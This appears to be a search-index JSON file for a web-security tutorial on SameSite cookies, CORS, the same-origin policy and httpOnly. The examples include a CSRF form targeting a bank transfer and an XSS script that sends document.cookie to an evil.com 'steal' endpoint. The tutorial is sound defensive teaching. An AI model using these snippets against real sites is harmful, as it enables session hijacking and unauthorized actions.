{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"Home","text":""},{"location":"#part-1-the-cookie-configuration-you-copy-paste","title":"Part 1: The Cookie Configuration You Copy-Paste","text":"<p>You've seen this code everywhere:</p> <pre><code>res.cookie('sessionId', token, {\n    httpOnly: true,\n    secure: isProduction,\n    sameSite: isProduction ? 'none' : 'lax',\n    maxAge: 3600000,\n    domain: isProduction ? '.yourdomain.com' : undefined\n});\n</code></pre> <p>But what is each line actually preventing? Let's reverse engineer it.</p>"},{"location":"#part-2-samesite-the-first-line-of-defense","title":"Part 2 \u2014 <code>SameSite</code>: the first line of defense","text":"<p><code>SameSite</code> controls when a cookie is sent by the browser.</p> <p>A cookie is the browser token a website uses to identify you.</p>"},{"location":"#samesitestrict","title":"<code>SameSite=Strict</code>","text":"<p>Cookies are sent only for same-site requests.</p> <ul> <li>Requests from <code>A.com</code> \u2192 <code>A.com</code> include Cookie A.</li> <li>Any request from <code>B.com</code> \u2192 <code>A.com</code> does not include Cookie A (cross-site requests are blocked).</li> </ul> <p>Examples:</p> <pre><code>A.com / POST ---(Cookie A)---&gt; A.com    // Cookie sent\nB.com / GET ---(X Cookie A)---&gt; A.com   // Cookie NOT sent (cross-site)\n</code></pre> <p>Cross-site actions (requests initiated from another site) will not have the cookie attached when <code>SameSite=Strict</code>.</p>"},{"location":"#samesitelax","title":"<code>SameSite=Lax</code>","text":"<p><code>Lax</code> is more permissive than <code>Strict</code>:</p> <ul> <li>Same-site requests: cookie is sent.</li> <li>Some cross-site safe top-level navigations (e.g., user clicking a normal link) will include the cookie.</li> <li>Cross-site non-GET requests (POST, PUT, etc.) will not include the cookie.</li> </ul> <p>Examples:</p> <pre><code>A.com / POST ---(Cookie A)---&gt; A.com    // Cookie sent (same site)\n\n// Cross-site GET via user navigation (link click)\nB.com (link to A.com) ---(Cookie A)---&gt; A.com   // Cookie sent\n\n// Cross-site POST form submission\nB.com / POST ---(X Cookie A)---&gt; A.com  // Cookie NOT sent\n</code></pre> <p>Under <code>SameSite=Lax</code>, a site like <code>B.com</code> can trigger a GET to <code>A.com</code> that will include <code>A.com</code>\u2019s cookie \u2014 this can leak session-related capabilities. We\u2019ll cover additional protections below.</p>"},{"location":"#samesitenone","title":"<code>SameSite=None</code>","text":"<p>Cookies are sent in all contexts (both same-site and cross-site), but <code>Secure</code> must also be set (cookie is sent only over HTTPS).</p> <p>Examples:</p> <pre><code>B.com / GET ---(Cookie A)---&gt; A.com   // Cookie sent\nB.com / POST ---(Cookie A)---&gt; A.com  // Cookie sent\n</code></pre>"},{"location":"#faq-what-happens-when-i-visit-bcom-does-the-browser-attach-acom-cookies-to-bcom","title":"FAQ: What happens when I visit <code>B.com</code> \u2014 does the browser attach <code>A.com</code> cookies to <code>B.com</code>?","text":"<p>Nothing special happens. Browsers only attach cookies that belong to the domain being requested. When you visit <code>B.com</code>, the browser will only look up and attach cookies for <code>B.com</code>. <code>A.com</code> cookies are not visible or accessible when browsing <code>B.com</code>.</p>"},{"location":"#part-3-the-loophole-in-lax-why-we-need-more","title":"Part 3 \u2014 The loophole in <code>Lax</code> (why we need more)","text":"<p>Problem: <code>SameSite: Lax</code> allows certain cross-site GET requests to include cookies. That means an attacker can sometimes trigger reads (GETs) that carry your session cookie. To prevent data theft, we need another layer of protection.</p>"},{"location":"#part-5-cors-the-second-layer-for-get-requests","title":"Part 5 \u2014 CORS: the second layer for GET requests","text":"<p>As noted above, under <code>SameSite=Lax</code> a cross-site GET can include cookies. An attacker can trigger a GET to your site and the request will reach the server and be processed. But modern browsers implement CORS to prevent unauthorized websites from reading those responses.</p> <p>Example attack (under SameSite: lax):</p> <p></p> <pre><code>Evil.com ---(Cookie A) /GET balance---&gt; Bank.com\nEvil.com ---(Cookie A) /GET messages---&gt; Facebook.com\n</code></pre> <p>A fetch example:</p> <pre><code>fetch('https://mybank.com/account-balance', {\n  method: 'GET',\n  credentials: 'include'\n});\n</code></pre> <p>CORS behavior:</p> <ul> <li>The request reaches the server.</li> <li>The server processes it and returns a response.</li> <li>But the browser blocks the attacking site's JavaScript from reading the response unless the server explicitly authorizes that origin.</li> </ul>"},{"location":"#what-is-origin-same-origin-policy-sop","title":"What is <code>Origin</code> (Same Origin Policy \u2014 SOP)?","text":"<pre><code>Origin = scheme + host + port\nhttps://example.com:443\n^^^^^   ^^^^^^^^^^^  ^^^\nscheme     host      port\n</code></pre> <p>Each part matters:</p> <ul> <li>Scheme (http vs https) \u2014 different schemes are different origins. This prevents insecure pages from accessing secure resources.</li> <li>Host \u2014 different hostnames are different origins (<code>bank.com</code> vs <code>api.bank.com</code>).</li> <li>Port \u2014 same host + scheme but different port is a different origin (<code>:443</code> \u2260 <code>:8080</code>).</li> </ul> <p>SOP is strict by default and blocks cross-origin reads. CORS provides a controlled relaxation: the server can explicitly allow specific origins to read its responses.</p>"},{"location":"#cors-controlled-relaxation-of-sop","title":"CORS: controlled relaxation of SOP","text":"<p>Server-side example (Express + cors):</p> <pre><code>app.use(cors({\n  origin: 'https://mysite.com',  // only this origin can read responses\n  credentials: true\n}));\n\n// Response header sent:\n// Access-Control-Allow-Origin: https://mysite.com\n</code></pre>"},{"location":"#part-7-samesite-vs-cors-the-complete-picture","title":"Part 7 \u2014 <code>SameSite</code> vs CORS \u2014 the complete picture","text":"<p>They protect different attack surfaces:</p> Feature Purpose Protects SameSite Controls whether cookies are sent Protects actions (CSRF) CORS Controls whether JS can read responses Protects data (exfiltration)"},{"location":"#examples","title":"Examples","text":"<p>Action protection (SameSite)</p> <pre><code>&lt;!-- You're on: http://evil.com --&gt;\n&lt;form action=\"https://mybank.com/transfer\" method=\"POST\"&gt;\n  &lt;input name=\"amount\" value=\"10000\"&gt;\n&lt;/form&gt;\n</code></pre> <ul> <li>Without <code>SameSite</code>: cookie is sent \u2192 transfer could succeed.</li> <li>With <code>SameSite='lax'</code> or <code>Strict</code>: cookie is not sent \u2192 transfer rejected.</li> </ul> <p>Data protection (CORS)</p> <pre><code>// On evil.com\nfetch('https://mybank.com/account-balance', {\n  method: 'GET',\n  credentials: 'include'\n});\n</code></pre> <ul> <li><code>SameSite: Lax</code> allows the GET and sends the cookie.</li> <li>Server responds.</li> <li>CORS can block JavaScript on <code>evil.com</code> from reading the response \u2014 protecting sensitive data.</li> </ul>"},{"location":"#defense-in-depth-use-both","title":"Defense in depth: use both","text":"<p>Example secure cookie + CORS configuration:</p> <pre><code>// Set cookie\nres.cookie('sessionId', 'abc123', {\n  httpOnly: true,   // protects against XSS reading the cookie\n  sameSite: 'lax',  // protects against cross-site POST actions\n  secure: true      // only send over HTTPS\n});\n\n// CORS: only let trusted origin read responses\napp.use(cors({\n  origin: 'https://mybank.com',\n  credentials: true\n}));\n</code></pre> <p>This combination defends against:</p> <ul> <li>XSS cookie theft (<code>httpOnly</code>)</li> <li>CSRF actions (<code>sameSite</code>)</li> <li>Cross-site data exfiltration (CORS)</li> </ul>"},{"location":"#important-clarification","title":"Important clarification","text":"<p>Q: Does <code>document.cookie</code> return all browser cookies? A: No \u2014 only cookies for the current domain are returned.</p> <p>Example:</p> <pre><code>// On https://mybank.com\nconsole.log(document.cookie);\n// e.g. \"sessionId=abc123; userId=456; theme=dark\"\n// \u2192 Only mybank.com cookies\n</code></pre> <p>However, if an attacker can run JavaScript on your site (XSS), the attacker can still steal non-<code>httpOnly</code> cookies:</p> <pre><code>&lt;script&gt;\n  fetch('http://evil.com/steal?cookie=' + document.cookie);\n  // This can leak sessionId if sessionId is not httpOnly\n&lt;/script&gt;\n</code></pre> <p>Setting <code>httpOnly</code> on session cookies prevents <code>document.cookie</code> from exposing them:</p> <pre><code>document.cookie  // \"theme=dark\"  \u2190 sessionId invisible if httpOnly\n</code></pre>"}]}